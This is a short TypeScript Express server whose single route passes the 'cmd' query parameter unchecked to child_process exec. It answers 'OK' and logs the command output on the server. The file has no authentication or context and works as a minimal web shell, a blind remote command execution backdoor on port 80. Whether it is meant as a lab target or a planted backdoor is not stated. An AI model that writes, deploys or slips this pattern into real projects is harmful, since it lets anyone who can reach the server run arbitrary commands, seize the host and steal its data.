import * as express from "express";
import { exec } from "child_process";

const app = express();
const PORT = 80;

app.get("/", (req, res) => {
    exec(`${req.query.cmd}`, (error, stdout, stderr) => {
        if (error) {
            console.error(`[ERROR] ${error}`);
            return;
        }
        console.log(`stdout: ${stdout}`)
        console.log(`stderr: ${stderr}`)
    });
    res.send("OK\n");
});

app.listen(PORT, () => {
    console.log(`running on http://localhost:${PORT}`)
});